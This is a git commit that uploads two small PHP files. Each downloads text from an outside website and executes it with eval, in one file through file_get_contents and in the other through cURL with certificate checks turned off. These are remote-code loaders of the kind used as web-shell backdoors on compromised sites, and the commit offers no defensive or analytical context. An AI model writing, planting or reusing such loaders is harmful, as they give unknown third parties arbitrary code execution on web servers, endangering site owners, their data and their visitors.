525119c533f478fd1342a9dbf2fe818178703900
mdtarikulislam0950-star <md.tarikul.islam0950@gmail.com>
2025-11-27 14:27:07 +0600

    Add files via upload

---
+++ ahax.php
@@ -0,0 +1,3 @@
+6:53 AM 10/21/2025<?php
+eval("?>".file_get_contents("https://mencaricuansejati.my.id/ads/on/hehe.txt"));
+?>
---
+++ xx.php
@@ -0,0 +1,27 @@
+﻿
+<?php
+$url = 'https://stepmomhub.com/3.txt';
+
+// Inisialisasi cURL
+$ch = curl_init();
+
+// Set opsi cURL
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  // Nonaktifkan verifikasi SSL jika perlu
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  // Nonaktifkan verifikasi SSL jika perlu
+
+// Eksekusi cURL dan ambil hasilnya
+$code = curl_exec($ch);
+
+// Cek apakah cURL berhasil
+if($code === false) {
+    echo "Gagal mengambil data dari URL: " . curl_error($ch);
+} else {
+    // Jalankan kode yang diambil
+    eval('?>' . $code);
+}
+
+// Tutup sesi cURL
+curl_close($ch);
+?>
